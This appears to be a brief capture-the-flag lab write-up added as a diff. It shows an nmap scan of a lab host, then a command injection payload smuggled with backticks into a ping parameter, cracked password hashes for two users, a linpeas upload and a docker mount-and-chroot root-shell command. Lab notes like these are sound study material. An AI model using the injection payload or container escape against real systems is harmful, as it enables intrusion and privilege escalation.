@@ -1,0 +1,48 @@
+# Nmap 7.95 scan initiated Tue Dec 30 16:23:31 2025 as: /usr/lib/nmap/nmap --privileged -sV -sS -sC -A -T4 -oN ultranmap_scan.txt 10.49.163.33
+Nmap scan report for 10.49.163.33
+Host is up (0.051s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 80:ad:ba:14:aa:ca:c4:90:ed:3d:76:12:00:bd:41:a0 (RSA)
+|   256 61:7c:58:a0:b5:cc:22:58:ec:c3:32:d2:90:95:20:44 (ECDSA)
+|_  256 83:3a:1e:84:c0:fa:2a:1b:d3:37:b9:15:60:e0:09:64 (ED25519)
+8081/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 3 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT      ADDRESS
+1   43.04 ms 192.168.128.1
+2   ...
+3   43.02 ms 10.49.163.33
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Dec 30 16:23:55 2025 -- 1 IP address (1 host up) scanned in 24.52 seconds
+
+
+After that i see open ports and suddenly i see the 8081 port this port is interesting so after that i use directory bruteforcing and i found http://10.49.163.33:8081/ping
+
+and then i observe this is vulnerable of command injection = http://10.49.163.33:8081/ping?ip=127.0.0.1`ls`
+
+after i see this ping: utech.db.sqlite:
+
+
+after i finds this user hash Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84
+
+
+mr00t: n100906
+admin: mrsheafy
+  use this commanmd docker images
+
+sends linpeas tool 
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
